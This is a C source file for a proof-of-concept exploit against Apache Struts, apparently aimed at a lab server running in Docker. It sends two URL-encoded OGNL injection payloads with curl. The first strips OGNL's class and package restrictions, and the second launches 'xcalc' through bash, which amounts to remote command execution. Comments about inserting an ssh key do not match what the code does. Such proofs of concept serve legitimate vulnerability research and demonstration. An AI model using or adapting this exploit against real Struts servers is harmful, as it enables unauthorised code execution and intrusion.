#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include "utils.h"

// NOTE:
// This exploit will not normally work if Struts is running in a docker
// container, because you cannot pop a calculator from inside docker. There
// are two ways to solve this problem. The first solution is to pass the
// following extra arguments on the `docker run` command line, to enable X
// applications to run from within the container:
//
// ```
// -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix
// ```
//
// The second solution is to run Struts outside of docker. The easiest way
// to do this is to follow the instructions in the README for building
// Struts in docker. Then just copy the tomcat directory out of docker. To
// do that, start docker like this:
//
// ```
// docker run -v `pwd`:/home/victim/temp -i -t struts-server
// ```
//
// And inside docker, copy the tomcat directory into `temp` which is mapped
// to the directory that you started docker from:
//
// ```
// cp -r apache-tomcat-9.0.12/ temp/
// ```

int main(int argc, char* argv[]) {
  if (argc < 2) {
    printf("usage example: http://172.16.0.10:8080/struts2-showcase\n");
    return 1;
  }

  const char* url = argv[1];

  // Scratch buffers for building the curl command line.
  char scratch1[2048];
  char scratch2[2048];
  char cmd[4096];

  // First OGNL payload, which we need to urlencode and send to the Struts
  // server with curl.
  const char* url1 =
    "${(#_=#attr['struts.valueStack']).(#context=#_.getContext())."
    "(#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl."
    "OgnlUtil@class)).(#ognlUtil.setExcludedClasses(''))."
    "(#ognlUtil.setExcludedPackageNames(''))}";

  // urlencode the first payload and send it to the Struts server.
  urlencode(scratch1, sizeof(scratch1), url1);
  snprintf(cmd, sizeof(cmd), "curl %s/%s/actionChain1.action", url, scratch1);
  system(cmd);

  // Second OGNL payload. We need to paste our ssh key into the middle of
  // this string and urlencode it.
  const char* url2 =
    "${(#_=#attr['struts.valueStack']).(#context=#_.getContext())."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#context."
    "setMemberAccess(#dm)).(#sl=@java.io.File@separator)."
    "(#p=new java.lang.ProcessBuilder({'bash','-c','xcalc'})).(#p.start())}";

  // Escape any slash characters in the ssh key, to stop Tomcat from
  // intercepting them.
  escape_forward_slash(scratch1, sizeof(scratch1), url2);

  urlencode(scratch2, sizeof(scratch2), scratch1);
  snprintf(cmd, sizeof(cmd), "curl %s/%s/actionChain1.action", url, scratch2);
  system(cmd);

  return 0;
}
